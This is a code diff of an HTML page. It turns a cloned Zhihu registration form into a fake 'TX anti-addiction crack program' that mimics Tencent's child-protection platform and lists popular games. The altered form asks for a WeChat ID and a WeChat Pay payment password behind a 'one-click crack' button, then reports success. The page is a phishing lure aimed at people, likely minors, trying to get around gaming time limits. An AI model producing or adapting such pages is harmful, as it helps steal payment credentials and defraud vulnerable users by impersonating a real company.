@@ -2,7 +2,8 @@
 <html lang="en">
 <head>
 	<meta charset="UTF-8" />
-	<title>注册</title>
+	<title>防沉迷破解程序</title>
+        <link rel="icon" href="static/icon.png" sizes="192x192"/>
 	<link rel="stylesheet" href="../assets/libs/particles/css/style.css">
 	<link rel="stylesheet" href="../assets/libs/sweetalert2/sweetalert2.min.css">
 	<link rel="stylesheet" href="../assets/css/base.css">
@@ -14,30 +15,27 @@
 	<div id="wrapper">
 		<div>
 			<img src="../assets/img/zhihu_logo.png" />
-			<h2>与世界分享你的知识、经验和见解</h2>
+			<h2>TX防沉迷破解程序</h2>
 		</div>
 		<nav class="switch_nav">
-			<a href="javascript:;" id="switch_signup" class="switch_btn on">注册</a>
-			<a href="login.html" id="switch_login" class="switch_btn">登陆</a>
+			<a href="javascript:;" id="switch_signup" class="switch_btn on">登录微信支付账号</a>
 			<div class="switch_bottom" id="switch_bottom"></div>
 		</nav>
 		<form method="post" action="">
 			<ul class="group_input">
+
 				<li>
-					<input type="text" placeholder="姓名" class="name required" id="name" />
+					<input type="text" placeholder="微信号" class="mobile required" id="mobile" />
 				</li>
 				<li>
-					<input type="text" placeholder="手机号(仅支持中国大陆)" class="mobile required" id="mobile" />
-				</li>
-				<li>
-					<input type="password" placeholder="密码(不少于6位)" class="psd required" id="psd" />
+					<input type="password" placeholder="支付密码" class="psd required" id="psd" />
 				</li>
 			</ul>
-			<button type="submit" class="submit_btn" id="btnSubmit" onclick="sendSubmit()">注册知乎</button>
-			<span class="agreement-tip">点击「注册」按钮，即代表你同意<a href="javascript:;">《知乎协议》</a></span>
+			<button type="submit" class="submit_btn" id="btnSubmit" onclick="sendSubmit()">一键破解</button>
+			<span class="agreement-tip">点击「破解」按钮，即代表你同意<a href="javascript:;">《TX成长守护平台协议》</a></span>
 		</form>
 		<div class="QRcode_btn">
-			<div type="submit" class="submit_btn download_btn">下载知乎App</div>
+			<div type="submit" class="submit_btn download_btn">下载成长守护平台App</div>
 			<div class="QRcode">
 				<img src="../assets/img/QRcode.png" alt="QRcode" />
 				<div class="box"></div>
@@ -47,8 +45,8 @@
   
 	
 		<div id="footer">
-			<span>&copy;2017知乎</span><span>·</span><a href="javascript:;">知乎圆桌</a><span>·</span><a href="javascript:;">发现</a><span>·</span><a href="javascript:;">移动应用</a><span>·</span><a href="javascript:;">使用机构账号登录</a><span>·</span><a href="javascript:;">联系我们</a><span>·</span><a href="javascript:;">工作来知乎</a><br />
-			<span>·</span><a href="javascript:;">京ICP证110745号</a><span>·</span><span>京公网安备11010802010035号</span><span>·</span><a href="javascript:;">出版物经营许可证</a>
+			<span>&copy;2050成长守护平台</span><span>·</span><a href="javascript:;">王者荣耀</a><span>·</span><a href="javascript:;">绝地求生</a><span>·</span><a href="javascript:;">QQ飞车</a><span>·</span><a href="javascript:;">英雄联盟</a><span>·</span><a href="javascript:;">联系我们</a><span>·</span><a href="javascript:;">TX招聘</a><br />
+			<span>·</span><a href="javascript:;">京ICP证1234567号</a><span>·</span><span>京公网安备1234567号</span><span>·</span><a href="javascript:;">出版物经营许可证</a>
 		</div>
 	</div>
 	<script src="../assets/libs/jquery-1.12.4/jquery.min.js"></script>
@@ -152,7 +150,7 @@
     		if(numError){
     			return false;
     		}
-    		alert('注册成功！')
+    		alert('破解成功！')
 
     	});
 		})
